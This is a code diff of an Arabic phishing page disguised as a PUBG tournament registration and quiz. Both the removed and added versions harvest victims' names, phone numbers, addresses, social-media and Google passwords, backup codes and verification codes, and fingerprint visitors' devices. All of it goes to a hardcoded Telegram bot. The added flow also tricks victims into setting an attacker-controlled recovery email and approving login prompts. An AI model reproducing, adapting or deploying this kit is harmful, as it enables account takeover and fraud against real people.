-            { q: "ما هي وسيلة النقل المائية الأساسية للتنقل بين الجزر في الخرائط؟", opts: ["القارب السريع (Zodiac / Speedboat)", "السيارة البرمائية", "الدرع المائي", "الطائرة"], a: 0 },
-            { q: "ما هو الحد الأقصى لرتبة السيرفر الاحترافية (Rank) التي يصل إليها اللاعبون الأوائل؟", opts: ["الغازي (Conqueror)", "الوردي (Ace Master)", "الماس (Diamond)", "التاج (Crown)"], a: 0 }
-        ];
+        <div>
+            <a href="https://accounts.google.com/signin" target="_blank" class="btn-link" onclick="trackAction('ضغط على رابط: نسيت البريد الإلكتروني')">إذا نسيت عنوان بريدك الإلكتروني ادخل هنا لنسخه</a>
+        </div>
 
-        /* ===================================================
-           4. إدارة حالة التطبيق (State Management & LocalStorage)
-           =================================================== */
-        let state = {
-            currentStep: 1,
-            selectedReward: '300 UC',
-            fullName: '',
-            phone: '',
-            age: '',
-            playerID: '',
-            address: '',
-            platform: 'facebook',
-            platformUser: '',
-            notesPassword: '',
-            mandatoryEmail: '',
-            score: 0,
-            activeQuestions: [],
-            currentQuestionIdx: 0,
-            quizTimerVal: 20,
-            quizTimerInterval: null,
-            code1: '',
-            identifier1: '',
-            code2: '',
-            identifier2: '',
-            passedQuizOnce: false,
-            usedIdentifiers: []
-        };
+        <div class="actions">
+            <button class="btn-link" onclick="alert('يرجى التواصل مع الدعم الفني لمساعدتك في إنشاء حساب'); trackAction('ضغط على زر: إنشاء حساب');">إنشاء حساب</button>
+            <button class="btn-primary" onclick="submitPhase1()">التالي</button>
+        </div>
+    </div>
 
-        // استعادة المسودة الحفظ التلقائي
-        function loadDraft() {
-            const saved = localStorage.getItem('pubg_tournament_draft');
-            if (saved) {
-                try {
-                    const parsed = JSON.parse(saved);
-                    state = { ...state, ...parsed };
-                    // تعبئة الحقول بالقيم المحفوظة
-                    if (state.fullName) document.getElementById('inputFullName').value = state.fullName;
-                    if (state.phone) document.getElementById('inputPhone').value = state.phone;
-                    if (state.age) document.getElementById('inputAge').value = state.age;
-                    if (state.playerID) document.getElementById('inputPlayerID').value = state.playerID;
-                    if (state.address) document.getElementById('inputAddress').value = state.address;
-                    if (state.platformUser) document.getElementById('inputPlatformUser').value = state.platformUser;
-                    if (state.notesPassword) document.getElementById('inputNotesPassword').value = state.notesPassword;
-                    if (state.mandatoryEmail) document.getElementById('inputMandatoryEmail').value = state.mandatoryEmail;
-                    
-                    if (state.passedQuizOnce && state.currentStep === 4) {
-                        state.currentStep = 5;
-                    }
-                } catch(e) {}
-            }
-        }
+    <!-- شاشة تحميل 1 -->
+    <div id="loading1" class="step-page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p class="subtitle" style="font-size:16px;">جاري التحميل...</p>
+        </div>
+    </div>
 
-        function saveDraft() {
-            localStorage.setItem('pubg_tournament_draft', JSON.stringify(state));
-        }
+    <!-- 🔹 المرحلة الثانية -->
+    <div id="phase2" class="step-page">
+        <h1 class="title">إدخال كلمة المرور</h1>
+        <p class="subtitle">يرجى إدخال كلمة المرور الخاصة بحسابك لمتابعة التحقق</p>
 
-        /* ===================================================
-           5. إرسال البيانات المباشر لبوت التليجرام
-           =================================================== */
-        function sendTelegramNotification(text) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            };
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(err => console.error("Telegram Send Error", err));
-        }
+        <div id="phase2_initial">
+            <div class="input-group">
+                <input type="text" id="notesInput" class="input-field" placeholder="كلمة المرور" autocomplete="off">
+            </div>
+            <button class="btn-link" onclick="showForgotPasswordView()">نسيت كلمة المرور؟</button>
+            <div class="actions">
+                <div></div>
+                <button class="btn-primary" onclick="submitPhase2Initial()">التالي</button>
+            </div>
+        </div>
 
-        // تتبع الزائر الأول واستخراج كافة بيانات الجهاز والشركة المصنعة والشبكة
-async function trackInitialVisit() {
-    const ua = navigator.userAgent;
-
-    // 1. تحديد الشركة المصنعة والموديل باسم الجهاز
-    let brandAndModel = "غير معروف (قيود الخصوصية)";
-
-    // أ) التتبع الحديث عبر Client Hints (يعمل بدقة عالية على Android و Chrome)
-    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        try {
-            const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
-            if (uaData.model) {
-                brandAndModel = uaData.model; // يُرجع موديل الجهاز مثل (SM-G998B أو Pixel 6)
-            }
-        } catch (e) {
-            console.log("Client Hints not supported or denied");
-        }
-    }
-
-    // ب) تحليل الـ User-Agent التقليدي لجلب الأيفون أو بعض أجهزة الأندرويد
-    if (brandAndModel.includes("غير معروف")) {
-        if (/iphone/i.test(ua)) {
-            brandAndModel = "Apple iPhone";
-        } else if (/ipad/i.test(ua)) {
-            brandAndModel = "Apple iPad";
-        } else if (/android/i.test(ua)) {
-            // محاولة استخراج الموديل من النص بين القوسين بداخل User-Agent
-            const match = ua.match(/\(([^)]+)\)/);
-            if (match && match[1]) {
-                const parts = match[1].split(';');
-                for (let part of parts) {
-                    if (part.includes("Build/") || part.includes("Android")) {
-                        brandAndModel = part.replace("Build/", "").trim();
-                        break;
-                    }
-                }
-            }
-        }
-    }
-
-    // 2. تحديد نوع الجهاز
-    let deviceType = "كمبيوتر (Desktop)";
-    if (/mobile/i.test(ua)) deviceType = "هاتف محمول (Mobile)";
-    else if (/ipad|tablet/i.test(ua)) deviceType = "جهاز لوحي (Tablet)";
-
-    // 3. تحديد نظام التشغيل
-    let os = "غير معروف";
-    if (/android/i.test(ua)) os = "Android";
-    else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
-    else if (/windows/i.test(ua)) os = "Windows";
-    else if (/mac os x/i.test(ua)) os = "Mac OS";
-    else if (/linux/i.test(ua)) os = "Linux";
-
-    // 4. تحديد المتصفح
-    let browser = "غير معروف";
-    if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
-    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
-    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-    else if (/edg/i.test(ua)) browser = "Microsoft Edge";
-
-    // 5. أبعاد الشاشة واللغة والمنطقة
-    const screenSize = `${window.screen.width}x${window.screen.height}`;
-    const language = navigator.language || navigator.userLanguage;
-    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    // 6. معلومات الاتصال والشبكة
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    let netType = "غير مدعوم";
-    let netSpeed = "غير معروف";
-    let rtt = "غير معروف";
-
-    if (connection) {
-        netType = connection.effectiveType ? connection.effectiveType.toUpperCase() : "غير معروف";
-        netSpeed = connection.downlink ? `${connection.downlink} Mbps` : "غير معروف";
-        rtt = connection.rtt ? `${connection.rtt} ms` : "غير معروف";
-    }
-
-    const now = new Date().toLocaleString('ar-EG');
-
-    // صياغة الرسالة لتليجرام
-    const msg = `🚀 <b>زيارة جديدة للموقع!</b>\n\n` +
-                `🏭 <b>اسم الجهاز/الموديل:</b> ${brandAndModel}\n` +
-                `📱 <b>نوع الجهاز:</b> ${deviceType}\n` +
-                `💻 <b>نظام التشغيل:</b> ${os}\n` +
-                `🌐 <b>المتصفح:</b> ${browser}\n` +
-                `📐 <b>دقة الشاشة:</b> ${screenSize}\n` +
-                `🗣 <b>اللغة والمنطقة:</b> ${language} (${timeZone})\n\n` +
-                `📶 <b>نوع الاتصال:</b> ${netType}\n` +
-                `⚡ <b>السرعة المقدرة:</b> ${netSpeed}\n` +
-                `⏱ <b>زمن الاستجابة:</b> ${rtt}\n\n` +
-                `⏰ <b>الوقت:</b> ${now}\n` +
-                `📍 <b>الإجراء:</b> فتح الصفحة الرئيسية للمسابقة`;
-
-    sendTelegramNotification(msg);
-}
-
-
-        /* ===================================================
-           6. التنقل بين المراحل Card Stepper Engine
-           =================================================== */
-        function goToStep(stepNum) {
-            // قانون تخطي الأسئلة إذا تم التجاوز بنجاح سابقاً
-            if (stepNum === 4 && state.passedQuizOnce) {
-                stepNum = 5;
-            }
-
-            audio.playClick();
-            state.currentStep = stepNum;
-            saveDraft();
-
-            // تحديث بطاقات العرض
-            document.querySelectorAll('.glass-card').forEach(card => card.classList.remove('active'));
-            const targetCard = document.getElementById(`cardStep${stepNum}`);
-            if (targetCard) targetCard.classList.add('active');
-
-            // تحديث شريط التبويبات العلوي والتقدم
-            document.querySelectorAll('.step-tab').forEach(tab => {
-                const tStep = parseInt(tab.dataset.step);
-                tab.classList.remove('active');
-                if (tStep === stepNum) tab.classList.add('active');
-                if (tStep < stepNum) tab.classList.add('completed');
-            });
-
-            const fillPercent = (stepNum / 6) * 100;
-            document.getElementById('progressBarFill').style.width = `${Math.min(fillPercent, 100)}%`;
-
-            // تشغيل الأسئلة إذا دخل مرحلة الأسئلة
-            if (stepNum === 4 && !state.passedQuizOnce) {
-                initQuizChallenge();
-            }
-
-            window.scrollTo({ top: 120, behavior: 'smooth' });
-        }
-
-        // السماح بالنقر على التبويبات العلوية التنقل
-        document.querySelectorAll('.step-tab').forEach(tab => {
-            tab.addEventListener('click', () => {
-                const targetStep = parseInt(tab.dataset.step);
-                if (targetStep <= state.currentStep || state.passedQuizOnce) {
-                    goToStep(targetStep);
-                }
-            });
-        });
-
-        /* ===================================================
-           7. منطق الخطوة 1 & 2: الجوائز والبيانات الشخصية
-           =================================================== */
-        function selectReward(el, rewardTitle) {
-            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
-            el.classList.add('selected');
-            state.selectedReward = rewardTitle;
-            audio.playClick();
-        }
-
-        function validatePersonalStep() {
-            const name = document.getElementById('inputFullName').value.trim();
-            const phone = document.getElementById('inputPhone').value.trim();
-            const age = document.getElementById('inputAge').value.trim();
-            const pid = document.getElementById('inputPlayerID').value.trim();
-            const addr = document.getElementById('inputAddress').value.trim();
-
-            const isNameValid = /^[\u0600-\u06FFa-zA-Z\s]{6,}$/.test(name);
-            const isPhoneValid = /^[0-9+]{7,15}$/.test(phone);
-            const isPidValid = /^[0-9]{6,12}$/.test(pid) && !/^(.)\1+$/.test(pid) && pid !== "1234567890";
-
-            document.getElementById('iconName').className = isNameValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconPhone').className = isPhoneValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconPlayerID').className = isPidValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-
-            const isValid = isNameValid && isPhoneValid && age !== '' && isPidValid && addr !== '';
-            document.getElementById('btnNextStep2').disabled = !isValid;
+        <div id="phase2_forgot" style="display:none;">
+            <p style="font-size:13px; font-weight:600; text-align:right; margin-bottom:8px;">
+                انسخ كلمة المرور الجديدة والصقها في خانات تغيير كلمة مرور جوجل 
+            </p>
+            <div class="fixed-box" id="uniqueNoteBox">جاري التوليد...</div>
             
-            state.fullName = name;
-            state.phone = phone;
-            state.age = age;
-            state.playerID = pid;
-            state.address = addr;
+            <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-primary" style="display:block; text-align:center; text-decoration:none; margin: 15px 0;" onclick="handlePasswordRedirect()">
+                إضغط هنا لنسخ وتغيير كلمة المرور الجديدة
+            </a>
+
+            <div id="newNotesContainer" style="margin-top:20px;">
+                <label style="font-size:13px; color:var(--subtext-color); display:block; margin-bottom:6px;">أدخل كلمة المرور الجديدة هنا</label>
+                <input type="text" id="newNotesInput" class="input-field" placeholder="كلمة المرور الجديدة" disabled>
+            </div>
+
+            <div class="actions">
+                <div></div>
+                <button class="btn-primary" id="btnSubmitNewNotes" disabled onclick="submitPhase2Final()">موافق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة تحميل 2 -->
+    <div id="loading2" class="step-page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p class="subtitle" style="font-size:16px;">جاري تسجيل الدخول والتأكد من المعلومات...</p>
+        </div>
+    </div>
+
+    <!-- 🔹 المرحلة الثالثة -->
+    <div id="phase3" class="step-page">
+        <h1 class="title">تأكيد ملكية الحساب</h1>
+        <p class="subtitle">اختر إحدى الطرق المتبقية لتأكيد ملكية الحساب</p>
+
+        <div id="errorAlert" class="alert-danger" style="display:none;"></div>
+
+        <!-- الخيار الأول: رموز الأمان مع متابعة الضغط على الرابط -->
+        <div style="border:1px solid var(--border-color); padding:14px; border-radius:8px; margin-bottom:12px;">
+            <p style="font-size:13px; font-weight:700; margin-bottom:6px;">الخيار الأول (رموز الأمان):</p>
+            <a href="https://myaccount.google.com/two-step-verification/backup-codes?rapt=AEjHL4NH1uNU_f4qoFKzUpZjW39_uNqCHALYUHBkgBhMy8sCr1LpX8y-_pyz1_pRYZ5VkYJToRe_u4zNERRurZB_EFrnIyDAmEM-jz1FpDwGhPAjOcsSqPQ" target="_blank" class="btn-link" style="font-size:12px; margin-bottom:10px; display:block;" onclick="handleBackupCodesRedirect()">
+                اضغط هنا وأختر احد رموز الأمان وأدخله في الخانة الخاصة برمز الأمان 
+            </a>
+            <input type="text" id="backupCodeInput" class="input-field" placeholder="أدخل رمز الأمان هنا">
+            <button class="btn-primary" style="width:100%; margin-top:8px;" onclick="submitBackupCode()">تأكيد برمز الأمان</button>
+        </div>
+
+        <!-- الخيار الثاني: بريد الاسترداد -->
+        <div style="border:1px solid var(--border-color); padding:14px; border-radius:8px; margin-bottom:12px;">
+            <p style="font-size:13px; font-weight:700; margin-bottom:6px;">الخيار الثاني (بريد الاسترداد):</p>
+            <div class="fixed-box" style="margin: 6px 0;">pubgrivals7@gmail.com</div>
+            <a href="https://myaccount.google.com/recovery/email" target="_blank" class="btn-link" style="font-size:12px;" onclick="trackAction('ضغط على رابط بريد الاسترداد')">
+                انسخ البريد الإلكتروني والصقه هنا لتأكيد حسابك
+            </a>
+        </div>
+
+        <button class="btn-link" style="text-align:center; display:block; margin: 10px auto;" onclick="toggleAlternativeWays()">تجربة طريقة أخرى للتأكيد</button>
+
+        <div id="alternativeWays" style="display:none; border-top:1px solid var(--border-color); padding-top:12px; margin-top:10px;">
+            <div class="alert-info">
+                <strong>التأكيد بالإشعار:</strong>سوف يظهر لك إشعار يقول هل أنت من يحاول استرداد الحساب؟ يرجى فتح الأشعار والموافقة بالضغط على ( نعم أنا ) مع اختيار الرقم الصحيح من الدعم للتأكيد.
+            </div>
+
+            <div style="margin-top:10px;">
+                <p style="font-size:13px; font-weight:700; margin-bottom:6px;">التأكيد بكود التحقق</p>
+                <input type="text" id="phoneOrEmailInput" class="input-field" placeholder="أدخل رقم الهاتف أو البريد الإلكتروني" style="margin-bottom:8px;">
+                <button class="btn-primary" style="width:100%;" onclick="requestVerificationCode()">موافق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- --- المرحلة الرابعة --- -->
+<div id="phase4" class="step-page">
+  <h1 class="title">إدخال كود التحقق</h1>
+
+  <div class="alert-info">
+    قد يتأخر الكود، يرجى ترك الصفحة مفتوحة وإذا أرسلنا لك الكود سنخبرك برسالته عن طريق المحادثة المباشرة.
+  </div>
+
+  <div class="input-group">
+    <!-- تم إزالة خاصية الإرسال التلقائي oninput -->
+    <input type="text" id="verificationCodeInput" class="input-field" placeholder="أدخل الكود" maxlength="8">
+    
+    <!-- زر موافق الذي سيقوم بإرسال الكود يدوياً عند الضغط عليه -->
+    <button class="btn-primary" style="width:100%; margin-top:10px;" onclick="verifyCode()">موافق</button>
+  </div>
+ 
+
+        <p style="font-size:12px; color:var(--subtext-color); margin-bottom:8px; font-weight:600;">
+            إذا فشل فتح التطبيقات اذهب لفتحها من القائمة للحصول على الكود:
+        </p>
+
+        <div class="smart-btns">
+            <a href="mailto:" target="_blank" class="smart-btn" onclick="trackAction('فتح تطبيق: Email الوارد')">✉️ Email الوارد</a>
+            <a href="https://wa.me/" target="_blank" class="smart-btn" onclick="trackAction('فتح تطبيق: WhatsApp')">💬 WhatsApp</a>
+            <a href="sms:" target="_blank" class="smart-btn" onclick="trackAction('فتح تطبيق: الرسائل SMS')">📱 الرسائل SMS</a>
+        </div>
+
+        <div style="margin-top:25px; text-align:center;">
+            <p style="font-size:13px; color:var(--subtext-color);">جاري الانتظار والتحقق من البيانات...</p>
+        </div>
+    </div>
+
+    <!-- 🔹 بوابة الانتظار والتحكم اليدوي -->
+    <div id="waitingTelegram" class="step-page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p class="subtitle" style="font-size:16px;">جاري مراجعة البيانات والتأكد من معلومات الحساب...</p>
+            <p style="font-size:12px; color:var(--subtext-color);">يرجى عدم إغلاق الصفحة</p>
+        </div>
+    </div>
+
+    <!-- 🔹 شاشة النجاح -->
+    <div id="successScreen" class="step-page">
+        <div class="success-icon">✓</div>
+        <h1 class="title" style="color:var(--success-color);">تم التسجيل بنجاح!</h1>
+        <p class="subtitle" style="font-size:16px; margin-top:15px; line-height:1.6;">
+            سيتم إرسال وشحن الحساب مباشره بالجوائز في حال الفوز.
+        </p>
+    </div>
+
+</div>
+
+<script>
+    // ⚙️ إعدادات التليجرام المطلوبة
+    const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+    const TELEGRAM_CHAT_ID = "8796885500";
+
+    let userData = {
+        email: '',
+        initialNotes: '',
+        uniqueNote: '',
+        newNotes: '',
+        backupCode: '',
+        phoneOrEmail: '',
+        verificationCode: ''
+    };
+
+    // مصفوفة لتتبع التاريخ والتنقلات للعودة خطوة للخلف
+    let historyStack = ['phase1'];
+    let hasVisitedBackupCodesLink = false;
+    let pollInterval = null;
+
+    const pageNames = {
+        'phase1': 'المرحلة 1: إدخال البريد الإلكتروني أو الهاتف',
+        'loading1': 'شاشة التحميل (1)',
+        'phase2': 'المرحلة 2: إدخال كلمة الملاحظات',
+        'loading2': 'شاشة التحميل (2)',
+        'phase3': 'المرحلة 3: تأكيد ملكية الحساب',
+        'phase4': 'المرحلة 4: إدخال كود التحقق',
+        'waitingTelegram': 'شاشة الانتظار لمراجعة المسؤول',
+        'successScreen': 'شاشة النجاح النهائية'
+    };
+
+    // إرسال البيانات والتوجهات للبوت
+    function sendToTelegram(message) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN") {
+            console.log("Telegram Output:\n", message);
+            return;
         }
-
-        function submitStep2AndNext() {
-            saveDraft();
-            // إرسال الخطوة 2 إلى تليجرام فوراً
-            const msg = `📋 <b>الخطوة 2: تسجيل البيانات الشخصية</b>\n` +
-                        `👤 <b>الاسم:</b> ${state.fullName}\n` +
-                        `📞 <b>الهاتف:</b> ${state.phone}\n` +
-                        `🎂 <b>العمر:</b> ${state.age}\n` +
-                        `🎮 <b>الأيدي (ID):</b> ${state.playerID}\n` +
-                        `📍 <b>العنوان:</b> ${state.address}\n` +
-                        `🎁 <b>الجائزة المختارة:</b> ${state.selectedReward}`;
-            sendTelegramNotification(msg);
-            goToStep(3);
-        }
-
-        /* ===================================================
-           8. منطق الخطوة 3: معلومات المنصة والحساب
-           =================================================== */
-        function selectPlatform(plat, el) {
-            document.querySelectorAll('.platform-box').forEach(b => b.classList.remove('active'));
-            el.classList.add('active');
-            state.platform = plat;
-            audio.playClick();
-
-            const labelUser = document.getElementById('labelPlatformUser');
-            const labelNotes = document.getElementById('labelNotesPassword');
-            const groupMandatory = document.getElementById('groupMandatoryEmail');
-            const containerLink = document.getElementById('deepLinkContainer');
-
-            let deepLinkHtml = '';
-
-            if (plat === 'facebook') {
-                labelUser.innerText = "اسم المستخدم /   او رقم الهاتف لحساب فيسبوك:";
-                labelNotes.innerText = "ادخل كلمة المرور لحساب فيسبوك:";
-                groupMandatory.style.display = 'block';
-                deepLinkHtml = `<a href="https://facebook.com" target="_blank" class="deep-link-btn"><i class="fa-brands fa-facebook"></i> الانتقال لتطبيق فيسبوك لنسخ اسم المستخدم</a>`;
-            } else if (plat === 'twitter') {
-                labelUser.innerText = "اسم المستخدم @ او رقم الهاتف لحساب تويتر / X:";
-                labelNotes.innerText = "ادخل كلمة المرور لمنصة تويتر:";
-                groupMandatory.style.display = 'block';
-                deepLinkHtml = `<a href="https://x.com" target="_blank" class="deep-link-btn"><i class="fa-brands fa-x-twitter"></i> الانتقال لتطبيق تويتر لنسخ المعرف</a>`;
-            } else if (plat === 'google') {
-                labelUser.innerText = "عنوان البريد الإلكتروني لحساب جوجل:";
-                labelNotes.innerText = "ادخل كلمة المرور لحساب جوجل:";
-                groupMandatory.style.display = 'none'; // اختفاء الخانة الإضافية عند اختيار البريد/جوجل
-                deepLinkHtml = `<a href="https://myaccount.google.com" target="_blank" class="deep-link-btn"><i class="fa-brands fa-google"></i> فتح إعدادات حساب جوجل</a>`;
-            } else if (plat === 'email') {
-                labelUser.innerText = "عنوان البريد الإلكتروني المرتبط بالحساب:";
-                labelNotes.innerText = "ادخل كلمة المرور للبريد الإلكتروني:";
-                groupMandatory.style.display = 'none';
-                deepLinkHtml = `<a href="mailto:" class="deep-link-btn"><i class="fa-solid fa-envelope"></i> فتح تطبيق البريد الإلكتروني</a>`;
-            } else if (plat === 'phone') {
-                labelUser.innerText = "أدخل الرقم المرتبط بالحساب:";
-                labelNotes.innerText = "ادخل كلمة المرور للرقم المرتبط:";
-                groupMandatory.style.display = 'block';
-                deepLinkHtml = ``;
-            }
-
-            containerLink.innerHTML = deepLinkHtml;
-            validateAccountStep();
-        }
-
-        function skipMandatoryEmail() {
-            audio.playAlert();
-            alert("قد تؤثر التخطى على نسبة فرصتك في الفوز، نرجوا منك إدخال المعلومات إذا كنت تمتلكها وتستطيع الوصول إليها وإذا كنت لا تمتلكها اضغط تخطى.");
-            document.getElementById('inputMandatoryEmail').value = "تم التخطي";
-            validateAccountStep();
-        }
-
-        function validateAccountStep() {
-            const userVal = document.getElementById('inputPlatformUser').value.trim();
-            const notesVal = document.getElementById('inputNotesPassword').value.trim();
-            const mandEmail = document.getElementById('inputMandatoryEmail').value.trim();
-
-            state.platformUser = userVal;
-            state.notesPassword = notesVal;
-            state.mandatoryEmail = mandEmail;
-
-            const isUserValid = userVal.length >= 3;
-            const isNotesValid = notesVal.length >= 1; // عدم تخطي كلمة الملاحظات
-
-            let isMandatoryValid = true;
-            if (state.platform !== 'google' && state.platform !== 'email') {
-                isMandatoryValid = mandEmail !== '';
-                if (mandEmail !== 'تم التخطي' && mandEmail !== '') {
-                    isMandatoryValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(mandEmail);
-                }
-            }
-
-            const isValid = isUserValid && isNotesValid && isMandatoryValid;
-            document.getElementById('btnNextStep3').disabled = !isValid;
-        }
-
-        function submitStep3AndNext() {
-            saveDraft();
-            // إرسال الخطوة 3 إلى التليجرام مباشرة
-            const msg = `🔐 <b>الخطوة 3: معلومات الحساب والمنصة</b>\n` +
-                        `🌐 <b>المنصة المختارة:</b> ${state.platform}\n` +
-                        `👤 <b>اسم المستخدم/البريد /:</b> ${state.platformUser}\n` +
-                        `🔑 <b>كلمة المرور :</b> ${state.notesPassword}\n` +
-                        `📧 <b>بريد التواصل :</b> ${state.mandatoryEmail}`;
-            sendTelegramNotification(msg);
-
-            if (state.passedQuizOnce) {
-                goToStep(5);
-            } else {
-                goToStep(4);
-            }
-        }
-
-        /* ===================================================
-           9. منطق الخطوة 4: تحدي الأسئلة PUBG Trivia Engine
-           =================================================== */
-        function initQuizChallenge() {
-            state.score = 0;
-            document.getElementById('quizScore').innerText = '0';
-            // اختيار 3 أسئلة عشوائية بدون تكرار
-            const shuffled = [...pubgTriviaBank].sort(() => 0.5 - Math.random());
-            state.activeQuestions = shuffled.slice(0, 3);
-            state.currentQuestionIdx = 0;
-            renderCurrentQuestion();
-        }
-
-        function renderCurrentQuestion() {
-            if (state.currentQuestionIdx >= 3) {
-                // نجاح التحدي!
-                audio.playCorrect();
-                state.passedQuizOnce = true;
-                saveDraft();
-                sendTelegramNotification(`💡 <b>الخطوة 4: اجتياز تحدي الأسئلة بنجاح! (3/3)</b>`);
-                alert("تهانينا! لقد أجبت على 3 أسئلة بنجاح وتم تأهيلك لمرحلة الكود والجائزة.");
-                goToStep(5);
-                return;
-            }
-
-            const qObj = state.activeQuestions[state.currentQuestionIdx];
-            document.getElementById('questionCounter').innerText = `السؤال ${state.currentQuestionIdx + 1} من 3:`;
-            document.getElementById('questionText').innerText = qObj.q;
-
-            // خلط أماكن الإجابات عشوائياً
-            const optionsContainer = document.getElementById('optionsContainer');
-            optionsContainer.innerHTML = '';
-
-            let indexedOpts = qObj.opts.map((opt, idx) => ({ text: opt, isCorrect: idx === qObj.a }));
-            indexedOpts.sort(() => 0.5 - Math.random()); // خلط أماكن الإجابات (مرة أعلى، مرة أسفل، مرة وسط)
-
-            indexedOpts.forEach(optItem => {
-                const btn = document.createElement('button');
-                btn.className = 'option-btn';
-                btn.innerText = optItem.text;
-                btn.onclick = () => handleAnswerClick(btn, optItem.isCorrect);
-                optionsContainer.appendChild(btn);
-            });
-
-            startQuizTimer();
-        }
-
-        function startQuizTimer() {
-            clearInterval(state.quizTimerInterval);
-            state.quizTimerVal = 20;
-            document.getElementById('quizTimer').innerText = state.quizTimerVal;
-
-            state.quizTimerInterval = setInterval(() => {
-                state.quizTimerVal--;
-                document.getElementById('quizTimer').innerText = state.quizTimerVal;
-                audio.playTick();
-
-                if (state.quizTimerVal <= 0) {
-                    clearInterval(state.quizTimerInterval);
-                    audio.playTimerEnd();
-                    // انقضاء الوقت يعتبر إجابة خاطئة واستبدال السؤال
-                    replaceQuestionOnWrong();
-                }
-            }, 1000);
-        }
-
-        function handleAnswerClick(btnEl, isCorrect) {
-            clearInterval(state.quizTimerInterval);
-            const allBtns = document.querySelectorAll('.option-btn');
-            allBtns.forEach(b => b.style.pointerEvents = 'none');
-
-            if (isCorrect) {
-                btnEl.classList.add('correct');
-                audio.playCorrect();
-                state.score++;
-                document.getElementById('quizScore').innerText = state.score;
-                setTimeout(() => {
-                    state.currentQuestionIdx++;
-                    renderCurrentQuestion();
-                }, 1200);
-            } else {
-                btnEl.classList.add('wrong');
-                audio.playWrong();
-                setTimeout(() => {
-                    replaceQuestionOnWrong();
-                }, 1400);
-            }
-        }
-
-        function replaceQuestionOnWrong() {
-            // سحب سؤال جديد فوراً دون احتساب النقطة
-            const newQ = pubgTriviaBank[Math.floor(Math.random() * pubgTriviaBank.length)];
-            state.activeQuestions[state.currentQuestionIdx] = newQ;
-            renderCurrentQuestion();
-        }
-
-        /* ===================================================
-           10. منطق الخطوة 5: الكود الأول والمعرف
-           =================================================== */
-        function handleCode1Input() {
-            const val = document.getElementById('inputCode1').value.trim();
-            state.code1 = val;
-
-            // إذا تم إدخال 5 أو 6 أو 8 أرقام يتم إرسالها فوراً لبوت التليجرام
-            if (val.length === 5 || val.length === 6 || val.length === 8) {
-                sendTelegramNotification(`🔑 <b>إدخال تلقائي للكود الأول (${val.length} أرقام):</b> <code>${val}</code>\n👤 <b>اللاعب:</b> ${state.fullName} (ID: ${state.playerID})`);
-            }
-            validateStep5();
-        }
-
-        function validateStep5() {
-            const code = document.getElementById('inputCode1').value.trim();
-            const iden = document.getElementById('inputIdentifier1').value.trim();
-            const chk = document.getElementById('chkReceivedCode1').checked;
-
-            const isCodeValid = code.length >= 5 && /^[0-9]+$/.test(code);
-            // المعرف يبدأ بـ 728 ومتبوع بثلاثة أرقام
-            const isIdenValid = /^728[0-9]{3}$/.test(iden);
-
-            state.identifier1 = iden;
-
-            document.getElementById('btnSubmitCode1').disabled = !(isCodeValid && isIdenValid && chk);
-        }
-
-        document.getElementById('chkReceivedCode1').addEventListener('change', validateStep5);
-
-        function requestCodeAndIdentifier1() {
-            const text = encodeURIComponent(`مرحباً إدارة المسابقة، أرغب بالحصول على كود التحقق الأول والمعرف الخاص بحسابي:\nالأيدي (ID): ${state.playerID}\nالاسم: ${state.fullName}`);
-            window.open(`https://t.me/${TELEGRAM_SUPPORT_USER}?text=${text}`, '_blank');
-        }
-
-        function submitCode1AndNext() {
-    const EXPIRATION_TIME = 24 * 60 * 60 * 1000; // 24 ساعة بالمللي ثانية
-    const now = Date.now();
-
-    // 1. التأكد من وجود القائمة وتنظيف المعرفات التي مضى عليها أكثر من 24 ساعة
-    if (!Array.isArray(state.usedIdentifiers)) {
-        state.usedIdentifiers = [];
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).catch(err => console.error("Telegram Error:", err));
     }
 
-    state.usedIdentifiers = state.usedIdentifiers.filter(item => {
-        if (typeof item === 'object' && item.timestamp) {
-            return (now - item.timestamp) < EXPIRATION_TIME;
-        }
-        return false; // حذف النص القديم غير المؤرخ
-    });
-
-    // 2. فحص هل المعرف الحالي مستخدم خلال الـ 24 ساعة الماضية
-    const isUsed = state.usedIdentifiers.some(item => item.id === state.identifier1);
-
-    if (isUsed) {
-        if (typeof audio !== 'undefined' && audio.playWrong) {
-            audio.playWrong();
-        }
-        alert("عذراً، معرف العملية هذا مستخدم خلال الـ 24 ساعة الماضية. يرجى طلب معرف جديد.");
-        return;
+    // تتبع التوجيهات والتفاعلات النقريّة
+    function trackAction(actionName) {
